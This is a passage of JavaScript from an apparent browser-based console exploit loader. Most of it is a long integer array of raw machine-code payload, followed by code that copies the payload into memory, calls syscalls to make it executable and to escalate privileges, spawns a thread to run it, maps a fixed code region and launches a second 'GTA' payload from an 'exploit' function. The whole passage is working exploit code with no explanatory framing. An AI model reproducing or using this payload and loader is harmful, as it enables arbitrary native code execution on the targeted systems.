276401481, 4294871368, 1087253, 898320384, 4384, 2247067976, 3099822528, 2148469285, 4292363535, 1121045, 3296937984, 1540917528, 1430373213, 1213551681, 1364458889, 142576456, 1609095985, 1224736767, 74760325, 274238280, 4293888328, 1075989, 1103136000, 108381321, 294275, 2236108404, 1716090075, 38828931, 2370585205, 155819, 4018752512, 4294918888, 1975551487, 10533423, 2303459328, 3750316270, 4293144901, 1104661, 3146598400, 160, 221370, 4294324480, 1097493, 71681792, 0, 3767092314, 1547787611, 1438866753, 4253632595, 2139834449, 3906679048, 4294966998, 1958774088, 1485522948, 4018751504, 266475007, 3229941760, 2105738869, 460587012, 1960543560, 3899670, 1962934274, 2072856590, 4274120740, 1166671871, 1522544900, 3116588379, 3221225602, 2303209999, 3787540689, 3356051488, 1220943887, 2169041545, 4278190050, 3257012223, 1224368028, 4287174029, 2370371583, 4294852744, 636125695, 687891655, 1636862410, 1207985349, 4276098445, 3934388223, 6608132, 2424949289, 6607680, 4111830344, 2181038073, 1648388842, 2311727360, 1648273040, 361580544, 4294965969, 646090052, 2181010773, 1789725162, 3358146816, 2302986793, 1789466240, 1167100160, 1459645099, 3324120989, 1220555203, 359989125, 1963297608, 1207959567, 2236088459, 1208382656, 1965062203, 827573234, 3968026843, 4286924816, 1065558900, 1209955586, 136606861, 253892095, 3229941760, 2336755573, 822617156, 2021869787, 2484011272, 3296938179, 1540917520, 1096237507, 1096106326, 1213420884, 1227418755, 2370371209, 4279772284, 981781, 1048789248, 1276998657, 2682845065, 2248146943, 1276212672, 369096585, 3776, 3921709377, 173, 138840897, 698, 764103680, 3816, 4046818120, 1157627918, 1149845131, 256182308, 1091331511, 239449871, 1237582145, 2303257699, 420872175, 1090519055, 3256, 3229960192, 1958971720, 1988839784, 3934865464, 4292839752, 977685, 2123057408, 3934865464, 4293822796, 973589, 113721600, 2, 1173850444, 4278740617, 933653, 2123057408, 3934865464, 2313062728, 4278985796, 963349, 608471808, 1049183496, 1832225608, 1207959566, 2302795657, 369035334, 3744, 608471876, 3296937996, 2302958376, 1547787712, 1581342017, 1103322945, 1213420884, 2169044361, 41196, 20939520, 1976338761, 4135929868, 2236431732, 3945559524, 609519926, 881412108, 4271695908, 2336817151, 3229951028, 203707531, 2303515509, 4018751713, 230299135, 938016768, 1207959553, 2011754377, 2248146942, 3138024896, 22, 61673, 1955416064, 2303201316, 2568355823, 2231369741, 264473024, 55429, 4557568, 1963063427, 1435191311, 3531950136, 11502607, 1810563072, 251852931, 48261, 1972062208, 1320619832, 1186402060, 1368213528, 3770763488, 3257485317, 1073382216, 10651151, 3800039424, 2575634191, 1207959552, 537285773, 1959953736, 1186402160, 2223851534, 4294901761, 3321972991, 2285797704, 1962934272, 3330492438, 2089633800, 2293897252, 4278190080, 886549, 2335042304, 1030099010, 1081474560, 612142408, 8960536, 2370306048, 754485, 1695940352, 1207959565, 270812299, 1207995208, 405030025, 611618120, 8960536, 2303459328, 1159069671, 3942645773, 244500, 233504768, 2204507511, 3094610680, 11707, 3956836608, 4292721453, 4125884415, 4294958011, 1726934015, 1962807357, 406677147, 1222473214, 405044365, 35002, 898451456, 2680, 2169017323, 41156, 1096637184, 1447150428, 3968026707, 4135931160, 1962641736, 4152970270, 609519944, 881412104, 4246530084, 2336817151, 3229951028, 609520456, 1209038088, 1209582723, 1096540041, 1160118110, 3338665996, 1090, 2202533888, 3224443076, 3277734235, 3850979413, 1447122753, 1413567809, 3968026707, 1166755880, 4287187200, 140938060, 1291028808, 1146646155, 1212446347, 4265130123, 2336817151, 2236108870, 1166625023, 1212582856, 264521097, 49028, 20939520, 3092613448, 2615677556, 2248146940, 1208579520, 3921171851, 164, 1172801868, 1726538801, 1224736764, 74760325, 274762572, 3363670856, 4294726888, 1224094207, 74760325, 275811144, 1308569925, 292875653, 3908012364, 4294966329, 1958774088, 2022394884, 3833941264, 2236119156, 1299412214, 2336812421, 782093, 3264548608, 3362601292, 2227213583, 4035527874, 2235904372, 1093432566, 4194493, 3321972736, 1291135301, 2303059849, 4069084398, 1435226623, 1015892932, 4270410790, 4293536068, 765717, 2334649088, 21546069, 3884534982, 451662335, 683967304, 1289652552, 1096548233, 1096630620, 1566523742, 186000895, 1137115136, 4, 3296937984, 3224460072, 1564564545, 1598119489, 2193212253, 264241152, 3515435058, 551665992, 264767816, 2303247904, 3800123634, 4294901759, 2629968399, 2370370143, 4294754837, 2290960639, 4294966848, 3819367041, 3391684707, 3789721737, 2370306147, 4294682645, 2190296319, 4288419071, 4145932929, 3391684707, 2311596353, 1677023632, 361580544, 4294966806, 831580801, 2302935140, 1676230016, 2311727360, 1680854160, 361580544, 4294966856, 1034414721, 3391684708, 1004769417, 2639724644, 3284541967, 33465, 1211240384, 3242774921, 155721953, 2425178312, 21708624, 2165672264, 1207959562, 3196096653, 2303197812, 682773, 2425178112, 21797768, 1427474760, 1207959562, 3762851981, 2303197809, 671509, 2425178112, 41018392, 689277256, 1207959562, 775458957, 2303197752, 660245, 2425178112, 3895264, 2098563400, 1207959562, 3767570573, 2303197200, 681749, 2425178112, 1106592, 1360365896, 1207959562, 2742063245, 2303197214, 670485, 2425178112, 3277824, 622168392, 1207959562, 151031949, 2303197189, 659221, 2425178112, 1006672, 4178938184, 1207959561, 1578143885, 2303197199, 647957, 2425178112, 1834448, 3440740680, 1207959561, 4275081357, 2303197211, 636693, 2425178112, 6559520, 1897236808, 1207959561, 595628173, 2303197283, 613141, 2425178112, 6540160, 1159039304, 1207959561, 3274739853, 2303197283, 601877, 2425178112, 6564224, 420841800, 1207959561, 3535835277, 2303197282, 590613, 2425178112, 6417888, 3977611592, 1207959560, 3645935757, 2303197282, 579349, 2425178112, 6477248, 3239414088, 1207959560, 3772813453, 2303197282, 568085, 2425178112, 6411824, 2501216584, 1207959560, 3591409805, 2303197215, 556821, 2425178112, 3811856, 1763019080, 1207959560, 742428813, 2303197242, 545557, 2425178112, 2970608, 1024821576, 1207959560, 3482357901, 2303197232, 534293, 2425178112, 1699280, 286624072, 1207959560, 3959459981, 2303197209, 523029, 2425178112, 1699712, 3843393864, 1207959559, 4023423117, 88604697, 1701280, 3373631816, 1207959559, 129631625, 1354956800, 3790127153, 3909091325, 4294966598, 4294461160, 3823721215, 1090519040, 1096171863, 1431585109, 3968026707, 2337039704, 9532, 2202075136, 2236153801, 2911113215, 1207959552, 410374789, 1305030981, 2215624837, 156, 51017, 3909091328, 144, 1221364041, 2370622345, 1292903540, 2303247753, 2089371893, 4130408484, 4282, 4152970240, 138024447, 2303459328, 1276126308, 539255949, 610044232, 3136696600, 48, 4293364044, 531221, 1955154944, 2336759844, 3339199612, 19407940, 1207959552, 807693449, 1223067980, 941907081, 1076118727, 1, 1143227591, 1, 612141388, 152436552, 1291845639, 2302799237, 1208579265, 941906987, 6129993, 1489273672, 1539868996, 1096565085, 1096696157, 1463927647, 1430345281, 1398101057, 1223459656, 1359317832, 1207959559, 539262093, 2100661576, 3103784966, 8, 2336794099, 1821199400, 2336759844, 491293, 1032669184, 1576, 127538687, 2370306048, 281789, 898451456, 1556, 4290939208, 1958774227, 1837844494, 3984934912, 4259957877, 2197815297, 2236153800, 293867501, 1207959554, 405030087, 0, 4293888328, 415509, 3229960192, 264472904, 119684, 2961916928, 256, 1170704712, 292943493, 103683583, 826605568, 3828434431, 58345, 353763072, 822083590, 1418545398, 2303203364, 4111859679, 2231369733, 1143895488, 2336814985, 440117, 115851520, 698, 4267920640, 116266495, 2236088320, 3297331648, 2303200116, 3224454593, 34025, 3750316032, 96605695, 2303197184, 3373662175, 3909091333, 340, 611617608, 1149846552, 2303200292, 210323663, 1183533092, 3330361376, 141, 541165896, 2605091656, 675383624, 3276180296, 809601352, 2312062603, 3938543298, 3134202120, 32, 943819110, 107615743, 2336751616, 1209541700, 1143213195, 203703435, 138447688, 1086423880, 1220576584, 405030025, 4282452084, 3325642176, 2303233663, 957743071, 1207959557, 369090441, 1344, 836929868, 4164504768, 2303208308, 3237955793, 1086489416, 947487590, 1223324933, 2199935371, 2236153800, 2860781531, 1157627904, 2370633521, 3944227956, 4291330830, 39145, 4286793984, 1126790176, 4027531, 1223723341, 76221837, 96075776, 1207959552, 2202660745, 21497031, 4246857950, 3230007295, 1777062772, 45321544, 1291861510, 2370367625, 289549, 571904, 2303197184, 4244498671, 3230007295, 2370324341, 3935741875, 4035529984, 1376619848, 3120562180, 5, 3908012360, 4294966491, 628473989, 2712898888, 1291883282, 2370367625, 275981, 113152, 2303197184, 4240042223, 99352575, 3959408771, 3833941275, 2336757364, 333621, 604276992, 4293364044, 346901, 604277504, 1220838216, 1547787611, 1581342017, 12803905, 0, 0, 1162559814, 1162559814, 1162559814, 1162559814, 2368127638, 2333877865, 4285217566, 307159087, 2126017525, 2273089628, 2933584231, 2873883040, 1691277431, 2790244714, 3433740699, 1067714934, 1660287673, 1236798084, 3298746114, 1456682778, 359572493, 2376078599, 546479511, 2999145027, 4090755069, 1328063081, 1082158946, 511720287, 2332899422, 1482074198, 3933198808, 373303826, 658369985, 2539888662, 3428137313, 150603146, 1448475944, 90543153, 1817695207, 191306765, 946287949, 993956028, 4072434858, 3527778027, 986328841, 2905997980, 2997993774, 1797225581, 543330209, 913102476, 2656328406, 631810352, 1041404989, 4028306957, 3765584518, 1748606166, 2524975579, 1097935640, 401111112, 520125835, 1976723478, 4074812823, 2893352045, 2983581974, 3504901045, 1629464511, 1761085531, 3167875303, 1438605369, 807435420, 1143492840, 710004226, 4259009573, 2593604998, 3824162590, 303010469, 2790022186, 3900690341, 442889051, 3113996232, 1569769770, 4140763348, 4233779715, 299611806, 1648222957, 1569258689, 758230167, 1890391491, 1520483845, 1151087846, 4276431736, 1758746168, 3869512579, 2879181562, 274696620, 74413455, 3166285500, 4198636983, 3021968462, 1805395722, 3956459435, 693256743, 1076217921, 1833492564, 2222424099, 614166349, 1797979729, 2661384232, 3390598589, 2040429965, 3954761818, 3656596945, 2804584450, 2728033973, 2820747223, 2710338896, 2545889169, 3250754238, 520915981, 355807710, 2546765881, 159329863, 3466380265, 1489547921, 493938806, 3863633778, 2485270186, 3012580038, 4025523103, 3277033047, 3620286691, 2030844592, 3567818523, 2966561409, 8217218, 3349038936, 1706354733, 1786250686, 1523134857, 3243302468, 1050541511, 1075266081, 1103755641, 265813185, 3802363444, 542776256, 1378856719, 1916044237, 856863663, 2954898465, 2972557510, 2963792729, 1531714638, 1352274015, 2038877208, 34668325, 2835583119, 485669431, 1158269971, 1951774741, 69478410, 3014334929, 4172694730, 1915400509, 2263102856, 138892651, 1772820005, 4277583645, 2, 822083584, 0, 0, 65280, 0, 0, 0, 0, 0, 1073741824, 805318656, 0, 1073741824, 0, 8388608, 4294918144, 4026531840, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 822083584, 0, 536871808, 65280, 0, 0, 0, 0, 0, 1073741824, 1073758208, 0, 1073741824, 2, 8388608, 4294918144, 4026531840, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1399153491, 1819043176, 1701998403, 2428514560, 37008, 0, 38633, 2425393152, 1701996032, 101, 0, 0, 0, 0, 1495131, 7968779, 8280595, 9728347, 1495175, 2323579, 7968823, 9728391, 5408, 1459647269, 1868786789, 1948280173, 1397760111, 1313163316, 774993440, 1768685623, 1919249250, 778855790, 2020765811, 1651076096, 1852990827, 2002742373, 1932419685, 7893616, 1801611628, 1701737061, 2037604204, 1886596723, 1593866354, 1920099679, 1929409135, 1699439971, 1818586738, 1684107084, 1918989395, 1685015924, 6646901, 1398958444, 1766614371, 1850303330, 1852990836, 1932422241, 7893616, 1936549229, 1828746341, 1885564261, 1886584953, 1953393010, 1932460134, 1702130553, 1868771181, 1852796269, 1651076143, 1651076143, 1399153491, 1951757177, 1932422249, 7893616, 1399153523, 1951757177, 1699966057, 2035508334, 1835365491, 1769238350, 1633904998, 1852795252, 1752459607, 1954047316, 0];
    for (var i = 0; i < payload.length; i++) {
      payloadbuf.backing[i] = payload[i];
    }
    p.syscall(74, payloadbuf, 65536, 7);
    p.syscall(324, 1);
    p.fcall(createThread, payloadbuf, 0, p.sptr("payload"));
    var code_addr = new int64(0x26100000, 0x00000009);
    var buffer = p.syscall(477, code_addr, 0x300000, 7, 0x41000, -1, 0);
    for (var i = 0; i < 0x300000; i += 8) {
      p.write8(code_addr.add32(i), 0);
    }
  };
  var code_addr = new int64(0x26100000, 0x00000009);
  var buffer = p.syscall(477, code_addr, 0x300000, 7, 0x41000, -1, 0);
  function runPAYLOAD() {
    p.fcall(code_addr);
  }
  function GTAdone() {
    document.getElementById("loader").style.display = "none";
    document.getElementById("done").style.display = "block";
    setTimeout(runPAYLOAD, 500);
  }
  var test = p.syscall(23, 0);
  if (test == "0") {
    writeGTA(p.write4, code_addr.add32(0x100000));
  }
  GTAdone();
};
function RUNexploit() {
  setTimeout(exploit, 1000);
}
